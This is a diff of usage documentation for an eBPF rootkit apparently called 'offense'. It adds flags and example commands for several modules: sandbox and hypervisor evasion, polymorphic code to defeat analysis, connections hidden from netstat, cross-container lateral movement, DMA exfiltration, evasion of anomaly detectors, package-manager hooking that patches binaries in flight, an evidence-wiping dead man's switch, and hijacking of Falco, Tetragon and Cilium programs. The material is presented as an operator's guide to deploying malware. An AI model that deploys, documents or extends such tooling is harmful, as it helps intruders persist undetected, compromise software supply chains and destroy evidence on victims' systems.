@@ -76,7 +76,16 @@ sudo ./target/release/offense --iface eth0 \
     --enable-icmp-exfil \
     --enable-socket-clone \
     --enable-cred-relay \
-    --enable-container-probe
+    --enable-container-probe \
+    --enable-hypervisor-evasion \
+    --enable-polymorphic \
+    --enable-phantom-stack \
+    --enable-container-lateral \
+    --enable-dma-covert \
+    --enable-behavioral-ai \
+    --enable-supply-chain \
+    --enable-deadman-switch \
+    --enable-bpf-parasitism
 ```
 
 ### CLI Flags
@@ -101,6 +110,15 @@ sudo ./target/release/offense --iface eth0 \
 | `--enable-socket-clone` | Enable socket cloning / connection shadowing |
 | `--enable-cred-relay` | Enable credential relay over C2 channel |
 | `--enable-container-probe` | Enable container escape probes |
+| `--enable-hypervisor-evasion` | Enable hypervisor detection/evasion (CPUID, hypercall, TSC) |
+| `--enable-polymorphic` | Enable polymorphic engine (bytecode morphing, pattern rotation) |
+| `--enable-phantom-stack` | Enable phantom network stack (invisible TCP connections) |
+| `--enable-container-lateral` | Enable cross-container lateral movement (cgroup/namespace abuse) |
+| `--enable-dma-covert` | Enable DMA covert channels (IOMMU, PCIe TLP, NIC exfil) |
+| `--enable-behavioral-ai` | Enable behavioral AI camouflage (syscall profiling, throttling) |
+| `--enable-supply-chain` | Enable supply chain persistence (package manager hooking) |
+| `--enable-deadman-switch` | Enable dead man's switch (heartbeat + scorched earth) |
+| `--enable-bpf-parasitism` | Enable BPF parasitism (prog scanning, tail-call injection) |
 
 ### Feature-Specific Examples
 
@@ -192,6 +210,106 @@ sudo ./target/release/offense --iface eth0 --enable-container-probe
 ```bash
 # Enable fileless execution path (memfd_create + execveat AT_EMPTY_PATH)
 sudo ./target/release/offense --iface eth0 --enable-memfd
+```
+
+#### 13. Hypervisor Evasion
+```bash
+# Detect hypervisor type and exploit blind spots
+sudo ./target/release/offense --iface eth0 --enable-hypervisor-evasion
+
+# Combined with polymorphic to evade VM-based analysis sandboxes
+sudo ./target/release/offense --iface eth0 \
+    --enable-hypervisor-evasion \
+    --enable-polymorphic
+```
+
+#### 14. Polymorphic Engine
+```bash
+# Enable self-modifying bytecode with pattern rotation
+sudo ./target/release/offense --iface eth0 --enable-polymorphic
+
+# Rotates instruction patterns via tail-call variant selection
+# Inserts opaque predicates to defeat static analysis tools
+```
+
+#### 15. Phantom Network Stack
+```bash
+# Create invisible TCP connections below kernel stack
+sudo ./target/release/offense --iface eth0 --enable-phantom-stack
+
+# Phantom connections are invisible to ss, netstat, and conntrack
+# Full stateful TCP handling (SYN/ACK, data transfer, FIN)
+```
+
+#### 16. Cross-Container Lateral Movement
+```bash
+# Enable cross-container movement via cgroup/namespace abuse
+sudo ./target/release/offense --iface eth0 --enable-container-lateral
+
+# Injects eBPF programs into target container cgroups
+# Traverses namespaces and detects credential changes for escape
+```
+
+#### 17. DMA Covert Channels
+```bash
+# Enable hardware-level covert channels
+sudo ./target/release/offense --iface eth0 --enable-dma-covert
+
+# Uses IOMMU page tables, PCIe TLP patterns, and NIC padding
+# for data exfiltration below OS visibility
+```
+
+#### 18. Behavioral AI Camouflage
+```bash
+# Enable statistical camouflage to evade anomaly detectors
+sudo ./target/release/offense --iface eth0 --enable-behavioral-ai
+
+# Profiles system behavior baseline, throttles rootkit activity
+# to stay within normal statistical norms
+```
+
+#### 19. Supply Chain Persistence
+```bash
+# Hook package managers and patch binaries during install
+sudo ./target/release/offense --iface eth0 --enable-supply-chain
+
+# Monitors apt/yum/pip/npm/cargo executions
+# Patches binaries in-flight and bypasses integrity checks
+```
+
+#### 20. Dead Man's Switch
+```bash
+# Arm the dead man's switch with heartbeat monitoring
+sudo ./target/release/offense --iface eth0 --enable-deadman-switch
+
+# If heartbeat UDP packets stop arriving, triggers scorched earth
+# wipe of all evidence (maps, logs, artifacts)
+```
+
+#### 21. BPF Parasitism
+```bash
+# Detect and parasitize other eBPF security tools
+sudo ./target/release/offense --iface eth0 --enable-bpf-parasitism
+
+# Scans for Falco/Tetragon/Cilium/Datadog programs
+# Injects into their tail-call arrays and hijacks prog arrays
+```
+
+#### Full Advanced Deployment
+```bash
+# Enable all advanced modules for maximum evasion
+sudo ./target/release/offense --iface eth0 \
+    --hide-pid $$ \
+    --enable-bpf-cloak \
+    --enable-hypervisor-evasion \
+    --enable-polymorphic \
+    --enable-phantom-stack \
+    --enable-container-lateral \
+    --enable-dma-covert \
+    --enable-behavioral-ai \
+    --enable-supply-chain \
+    --enable-deadman-switch \
+    --enable-bpf-parasitism
 ```
 
 ### Network C2 Commands
